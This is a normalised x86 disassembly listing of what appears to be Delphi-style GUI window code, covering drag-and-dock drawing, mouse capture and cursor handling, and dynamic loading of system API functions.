call sub_443be8
mov esi eax
mov [ ebx + 0x5c ] esi
push 0x412
push 0x0
push esi
call GetDCEx
mov [ ebx + 0x58 ] eax
mov eax [ esp ]
mov [ ebx + 0x50 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x54 ] eax
mov eax ebx
call sub_448050
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_447f88
push ebx
mov ebx eax
xor edx edx
mov eax [ rw-data ]
call sub_448d58
mov eax ebx
call sub_448050
mov eax [ ebx + 0x58 ]
push eax
mov eax [ ebx + 0x5c ]
push eax
call ReleaseDC
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
cmp [ edx + 0x10 ] 0x1
jne r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
mov edx [ ebx + 0xc ]
sar edx 0x1
jns r-xdata
add edx [ ebx + 0x50 ]
call sub_44619c
adc edx 0x0
add edx [ ebx + 0x54 ]
call sub_44619c
jmp r-xdata
adc edx 0x0
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_447eac
push ebx
push sub_44802c
mov eax [ ebx + 0x60 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_446530
xor eax eax
mov [ ebx + 0x60 ] eax
pop ebx
retn
sub_448004
push ebx
mov ebx eax
cmp [ ebx + 0x6c ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x14 ]
call sub_44259c
test eax eax
jle r-xdata
push ebx
push sub_44802c
xor edx edx
mov eax ebx
call sub_446530
sub_448050
push ebx
push esi
add esp 0xfffffff0
mov ebx eax
mov esi [ ebx + 0x60 ]
test esi esi
je r-xdata
add esp 0x10
pop esi
pop ebx
retn
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx 0x2
mov eax esi
call sub_445d1c
mov [ esp ] eax
mov eax [ ebx + 0xc ]
sar eax 0x1
jns r-xdata
mov edx [ ebx + 0x50 ]
sub edx eax
mov [ esp ] edx
mov edx 0x1
mov eax esi
call sub_445d1c
mov [ esp + 0x4 ] eax
mov eax [ esp ]
add eax [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
mov edx 0x1
mov eax [ ebx + 0x60 ]
call sub_445da0
add eax [ esp + 0x4 ]
mov [ esp + 0xc ] eax
adc eax 0x0
mov edx [ ebx + 0x54 ]
sub edx eax
mov [ esp + 0x4 ] edx
mov edx 0x2
mov eax [ ebx + 0x60 ]
call sub_445da0
add eax [ esp ]
mov [ esp + 0x8 ] eax
mov eax [ esp + 0x4 ]
add eax [ ebx + 0xc ]
mov [ esp + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebx + 0x10 ]
call sub_423efc
push eax
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
mov esi eax
push 0x5a0049
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x8 ]
sub ecx edx
push ecx
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0x8 ]
sub ecx eax
push ecx
push edx
push eax
mov eax [ ebx + 0x58 ]
push eax
call PatBlt
push esi
mov eax [ ebx + 0x58 ]
push eax
call SelectObject
sub_44813c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebp + 0x8 ]
cmp ebx [ eax - 0x4 ]
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x14 ]
cmp al [ edx + 0x10 ]
jne r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_44813c
pop ecx
mov eax ebx
call sub_446174
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_446174
cmp edi eax
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_44813c
pop ecx
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x8 ]
mov eax ebx
call sub_446174
cmp eax esi
jle r-xdata
mov esi [ ebx + 0x4 ]
test esi esi
je r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx - 0x8 ] eax
mov eax esi
cmp [ esi + 0x57 ] 0x0
je r-xdata
sub_4481cc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0xc ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_446174
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_445cd4
add esi eax
mov [ ebp - 0x8 ] esi
mov eax esi
call sub_446174
mov [ ebp - 0x8 ] eax
jmp r-xdata
push ebp
mov eax [ ebx + 0x64 ]
mov eax [ eax + 0x8 ]
call sub_44813c
pop ecx
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_44821c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov bl 0x4
test esi esi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_43ba58
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_43ba58
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x1c ]
jg r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x20 ]
jg r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jge r-xdata
mov eax [ ebp - 0x1c ]
add eax [ ebp - 0x14 ]
sar eax 0x1
jns r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov eax [ ebp - 0x8 ]
cmp eax [ ebp - 0x18 ]
jl r-xdata
cmp eax [ ebp - 0xc ]
jg r-xdata
adc eax 0x0
mov eax [ ebp - 0x4 ]
cmp eax [ ebp - 0x14 ]
jl r-xdata
mov bl 0x1
jmp r-xdata
mov bl 0x2
mov bl 0x3
jmp r-xdata
sub_448298
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_445bd4
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x24 ] eax
mov eax ebx
call sub_445c8c
mov edx [ ebx + 0x20 ]
sub edx eax
mov [ ebx + 0x24 ] edx
jmp r-xdata
mov eax ebx
call sub_44625c
test eax eax
je r-xdata
mov eax esi
call sub_445c54
test al al
jne r-xdata
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44802c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebx + 0x14 ]
call sub_446530
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_44625c
mov edx [ ebx + 0x20 ]
call sub_4461b0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebx + 0x14 ]
call sub_448298
pop ecx
sub_448318
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi eax
mov esi [ edi + 0x14 ]
test esi esi
je r-xdata
mov eax [ edi + 0x14 ]
call sub_445c30
dec eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x64 ]
je r-xdata
mov bl 0x1
jmp r-xdata
cmp [ edi + 0x24 ] 0x0
jne r-xdata
mov eax esi
call sub_445c30
dec eax
jne r-xdata
test bl bl
je r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x18 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xc ]
add eax 0xe
mov [ ebp - 0x4 ] eax
mov eax edi
call sub_44625c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ edi + 0x14 ]
call sub_448318
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
push sub_44802c
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ edi + 0x14 ]
call sub_446530
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ edi + 0x14 ]
call sub_445e58
mov eax edi
call sub_446250
test eax eax
je r-xdata
mov eax edi
call sub_44625c
mov esi eax
mov eax esi
call sub_446174
push eax
mov eax esi
call sub_445c8c
pop edx
sub edx eax
sub edx [ edi + 0x24 ]
cmp edx [ ebp - 0x4 ]
jge r-xdata
mov eax edi
call sub_446250
call sub_446174
sub eax [ edi + 0x24 ]
cmp eax [ ebp - 0x4 ]
jge r-xdata
mov eax esi
call sub_446174
mov edx eax
sub edx [ edi + 0x24 ]
mov eax esi
call sub_44619c
mov eax esi
call sub_446174
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44619c
mov eax edi
call sub_44625c
call sub_4461f0
jmp r-xdata
mov bl 0x1
jmp r-xdata
mov eax edi
call sub_445c8c
mov edx eax
add edx [ edi + 0x24 ]
mov eax edi
call sub_44619c
mov eax edi
call sub_446250
call sub_4461f0
mov bl 0x1
jmp r-xdata
sub_448450
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov ebx ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4464c8
test eax eax
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x10 ]
mov edx [ esi + 0x44 ]
mov eax [ esi + 0x40 ]
call sub_415348
lea edx [ ebp - 0x10 ]
lea ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_446cac
test eax eax
je r-xdata
push ebp
call sub_448298
pop ecx
push ebp
call sub_448318
pop ecx
jmp r-xdata
xor ebx ebx
mov ebx [ eax + 0x4 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
mov edx [ eax ]
call [ edx + 0x80 ]
jmp r-xdata
push ebx
mov edx ebx
mov eax esi
call sub_44821c
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_4484d8
push ebx
push esi
push edi
push ebp
add esp 0xffffffe8
mov esi edx
mov edi eax
mov [ esp + 0xc ] 0x0
mov eax [ esi ]
cmp eax 0x204
jg r-xdata
sub eax 0x205
je r-xdata
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov ecx eax
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov ecx eax
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
cmp eax 0x201
jg r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov ecx eax
or cl [ r-xdata ]
mov dl 0x1
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
sub eax 0xae2a
je r-xdata
sub eax 0x202
je r-xdata
je r-xdata
add esp 0x18
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x32 ] 0x0
je r-xdata
mov edx esi
mov eax [ edi + 0x34 ]
call [ edi + 0x30 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub eax 0x12
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov ecx eax
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
dec eax
je r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov ecx eax
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
sub eax 0x20
je r-xdata
mov edx esi
mov eax [ edi + 0x34 ]
call [ edi + 0x30 ]
mov [ esp + 0xc ] 0x1
mov ebp [ esi + 0x8 ]
lea eax [ ebp + 0x38 ]
push eax
lea ecx [ ebp + 0x18 ]
lea edx [ ebp + 0x28 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x34 ]
mov eax [ esi + 0x8 ]
cmp [ eax ] 0xb00b
jne r-xdata
movsx eax [ esi + 0x8 ]
push eax
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x14 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov ecx eax
or cl [ r-xdata ]
xor edx edx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x14 ]
jmp r-xdata
jmp r-xdata
push esp
call GetCursorPos
lea ecx [ esp + 0x10 ]
mov edx esp
mov eax [ edi + 0x14 ]
call sub_43bc78
mov eax [ esp + 0x10 ]
mov [ esp ] eax
mov eax [ esp + 0x14 ]
mov [ esp + 0x4 ] eax
cmp [ esi + 0x8 ] 0x1
jne r-xdata
sub eax 0x1e0
je r-xdata
mov ecx [ eax + 0x4 ]
mov edx [ esi + 0x4 ]
mov eax edi
call sub_448450
jmp r-xdata
mov eax [ edi + 0x14 ]
call sub_443be8
cmp eax [ esi + 0x4 ]
jne r-xdata
movsx eax [ esi + 0xa ]
push eax
lea eax [ esp + 0x10 ]
push eax
movzx eax [ esi + 0x4 ]
call sub_44e5e0
mov edx eax
movsx ecx [ esi + 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x18 ]
jmp r-xdata
jmp r-xdata
mov eax [ edi + 0x14 ]
call sub_442630
test eax eax
jle r-xdata
lea ecx [ esp + 0x8 ]
mov edx esp
mov eax edi
call sub_446cac
mov ebx eax
test ebx ebx
je r-xdata
cmp [ esp + 0x8 ] 0x12
jne r-xdata
mov eax [ ebx + 0x14 ]
movzx eax [ eax + 0x10 ]
movsx edx [ eax * 2 + rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_456450
push eax
call SetCursor
mov [ esi + 0xc ] 0x1
mov [ esp + 0xc ] 0x1
jmp r-xdata
sub_448770
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ebx edx
mov [ esp ] ebx
fild [ esp ]
fdiv [ r-xdata ]
mov [ esp + 0x4 ] esi
fild [ esp + 0x4 ]
fmulp st1
call sub_403260
pop ecx
pop edx
pop esi
pop ebx
retn
sub_4487a0
push ebx
push esi
add esp 0xfffffff8
mov ebx ecx
mov esi edx
test ebx ebx
je r-xdata
xor eax eax
mov [ esp ] esi
fild [ esp ]
mov [ esp + 0x4 ] ebx
fild [ esp + 0x4 ]
fdivp st1
fmul [ r-xdata ]
call sub_403260
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
sub_448804
push ebx
mov eax [ ecx ]
sub eax [ edx + 0x40 ]
add eax eax
sub [ ecx ] eax
mov eax [ ecx + 0x4 ]
sub eax [ edx + 0x44 ]
add eax eax
sub [ ecx + 0x4 ] eax
mov eax [ ecx + 0x8 ]
sub eax [ ecx ]
mov ebx [ edx + 0x48 ]
sub ebx eax
mov eax ebx
add eax eax
sub [ ecx + 0x8 ] eax
mov eax [ ecx + 0xc ]
sub eax [ ecx + 0x4 ]
mov edx [ edx + 0x4c ]
sub edx eax
mov eax edx
add eax eax
test eax eax
jle r-xdata
pop ebx
retn
sub [ ecx + 0xc ] eax
sub_448844
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov [ ebp - 0x1 ] cl
mov ebx eax
test dl dl
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
test [ ebp - 0x1 ] 0x40
je r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_415348
lea edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x8 ]
mov eax ebx
call sub_446cac
mov esi eax
test esi esi
je r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_415348
lea edx [ ebp - 0x2c ]
lea ecx [ ebp - 0x8 ]
mov eax ebx
call sub_446cac
mov esi eax
test esi esi
je r-xdata
cmp [ ebp - 0x8 ] 0x12
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
lea ecx [ ebp - 0x2c ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_415348
lea ecx [ ebp - 0x2c ]
mov edx esi
mov eax ebx
call sub_447f28
jmp r-xdata
cmp [ ebp - 0x8 ] 0x2
jne r-xdata
push 0x0
push 0x203
push 0x203
mov eax [ ebx + 0x14 ]
call sub_443be8
push eax
lea eax [ ebp - 0x24 ]
push eax
call PeekMessageA
test eax eax
jne r-xdata
call sub_43a664
push 0x1
xor ecx ecx
xor edx edx
mov eax [ esi + 0x4 ]
call sub_43cf48
jmp r-xdata
mov eax [ esi + 0x4 ]
cmp [ eax + 0x8f ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax ] 0x1
cmp [ eax + 0x5d ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0xd4 ]
or ecx 0xffffffff
xor edx edx
call sub_43c884
sub_448968
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov ebx [ eax + 0x18 ]
mov eax [ edi ]
mov esi [ eax + 0x60 ]
mov eax [ esi + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax esi
mov edx 0x2
call sub_445d1c
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jl r-xdata
mov eax esi
mov edx 0x1
call sub_445d1c
add eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jl r-xdata
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4481cc
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x50 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov eax [ edi ]
mov edx [ eax + 0x60 ]
mov eax [ edi ]
call sub_4481cc
sub eax ebx
mov edx [ edi ]
cmp eax [ edx + 0x54 ]
jg r-xdata
mov edx [ edi ]
mov [ edx + 0x54 ] eax
pop edi
pop esi
pop ebx
pop ebp
retn
mov edx [ edi ]
mov [ edx + 0x50 ] eax
mov edx [ edi ]
mov [ edx + 0x54 ] eax
jmp r-xdata
sub_4489f8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
call sub_448050
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_415348
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x50 ] edx
mov edx [ ebp - 0x8 ]
mov [ eax + 0x54 ] edx
push ebp
call sub_448968
pop ecx
mov eax [ ebp - 0x4 ]
call sub_448050
sub_448a48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov ebx eax
test dl dl
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
cmp [ ebx + 0x60 ] 0x0
jne r-xdata
mov eax ebx
call sub_447f88
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_415348
lea edx [ ebp - 0xc ]
lea ecx [ ebp - 0x4 ]
mov eax ebx
call sub_446cac
mov ebx eax
test ebx ebx
je r-xdata
cmp [ ebp - 0x4 ] 0x14
jne r-xdata
mov esi [ ebx + 0x4 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4040f0
test al al
je r-xdata
mov eax esi
xor edx edx
call sub_43c068
jmp r-xdata
mov eax esi
call sub_454bfc
jmp r-xdata
sub_448abc
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x24 ] ebx
mov esi edx
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0xc ] ecx
mov esi eax
xor eax eax
push ebp
push sub_448b9d
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x8 ]
mov ebx eax
cmp [ ebp - 0x10 ] 0x12
jne r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
call sub_404e44
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_448ba4
lea eax [ ebp - 0x24 ]
call sub_404e44
retn
mov eax [ ebp - 0x10 ]
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_43ba58
lea ecx [ ebp - 0x20 ]
mov edx ebx
mov eax esi
mov esi [ eax ]
call [ esi ]
mov eax [ ebp - 0x20 ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x20 ] eax
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x20 ]
mov edx [ ebx + 0x48 ]
sub edx eax
mov eax edx
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
sub eax [ ebp - 0x1c ]
mov edx [ ebx + 0x4c ]
sub edx eax
mov eax edx
add eax eax
sub [ ebp - 0x14 ] eax
lea edx [ ebp - 0x24 ]
mov eax ebx
call sub_43c148
mov edx [ ebp - 0x24 ]
mov eax [ ebp + 0x8 ]
call sub_404e98
mov eax [ ebp - 0xc ]
mov edi eax
lea esi [ ebp - 0x20 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
sub eax 0x12
jne r-xdata
sub_448bb0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403f34
mov [ esi + 0x4 ] 0x1
mov [ esi + 0x8 ] 0x5
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
add esp 0xfffffff0
call sub_404288
mov eax [ rw-data ]
cmp [ eax ] 0x1
jne r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jge r-xdata
xor eax eax
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov al 0x1
mov [ esi + 0xd ] al
xor edx edx
mov eax esi
call sub_448da0
mov eax esi
test bl bl
je r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
mov eax esi
pop esi
pop ebx
retn
call sub_4042e0
pop [ fs : 0x0 ]
add esp 0xc
mov eax [ rw-data ]
cmp [ eax ] 0xa
jge r-xdata
sub_448c40
push ebx
mov ebx eax
xor eax eax
cmp [ ebx + 0x2c ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x20 ] 0x0
je r-xdata
xor edx edx
mov eax ebx
call sub_448d80
xor ecx ecx
mov dl 0x1
mov eax [ ebx + 0x2c ]
call [ eax + 0x2c ]
mov [ ebx + 0x28 ] eax
sub_448c6c
push ebx
push esi
call sub_404330
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_448d58
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403f54
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4042d8
sub_448cc0
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x28 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
mov edx [ eax ]
call [ edx + 0xdc ]
test al al
jne r-xdata
mov al 0x1
pop esi
pop ebx
retn
sub_448d00
push ebx
push esi
mov esi eax
push 0x4b
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x20 ] bl
test bl bl
je r-xdata
pop esi
pop ebx
retn
push 0x0
lea eax [ esi + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
sub_448d30
push ebx
push ecx
mov ebx eax
push esp
lea eax [ ebx + 0x10 ]
push eax
lea ecx [ ebx + 0x14 ]
lea edx [ ebx + 0x24 ]
lea eax [ ebx + 0x1c ]
call sub_407e68
mov [ ebx + 0x18 ] eax
cmp [ ebx + 0x1c ] 0x0
setne al
mov [ ebx + 0x20 ] al
pop edx
pop ebx
retn
sub_448d58
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_448c9c
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test esi esi
jne r-xdata
push esi
call SetCapture
call ReleaseCapture
jmp r-xdata
sub_448d80
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x28 ]
cmp esi eax
je r-xdata
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov [ ebx + 0x28 ] esi
lea eax [ ebx + 0x28 ]
call sub_40f8bc
sub_448da0
push ebx
mov ebx eax
sub edx 0x1
jb r-xdata
mov eax ebx
call sub_448ce4
cmp [ ebx + 0xd ] 0x0
jne r-xdata
sub edx 0x67
je r-xdata
mov eax ebx
call sub_448d00
pop ebx
retn
mov eax ebx
call sub_448d30
jmp r-xdata
cmp [ ebx + 0x20 ] 0x0
je r-xdata
jmp r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
call SendMessageA
mov [ ebx + 0x10 ] eax
push 0x0
lea eax [ ebx + 0x10 ]
push eax
push 0x0
push 0x68
call SystemParametersInfoA
jmp r-xdata
sub_448e04
push ebp
mov ebp esp
push ecx
push ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
push 0x8000
call SetErrorMode
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_448f6a
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
push r-xdata
call GetModuleHandleA
mov ebx eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call SetErrorMode
retn
push r-xdata
call LoadLibraryA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_449088
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp bl 0x3
je r-xdata
test bl bl
jne r-xdata
mov dl 0x1
mov eax esi
call sub_44906c
cmp [ rw-data ] 0x0
je r-xdata
xor edx edx
mov eax esi
call sub_44906c
jmp r-xdata
push esi
call [ rw-data ]
mov edi eax
test edi edi
je r-xdata
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
mov eax ebx
dec al
je r-xdata
push 0x0
push edi
call [ rw-data ]
jmp r-xdata
dec al
je r-xdata
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
push edi
call [ rw-data ]
push edi
push esi
call [ rw-data ]
push 0x1
push edi
call [ rw-data ]
jmp r-xdata
jmp r-xdata
push 0x1
push edi
call [ rw-data ]
lea eax [ esp + 0x4 ]
push eax
lea eax [ esp + 0x4 ]
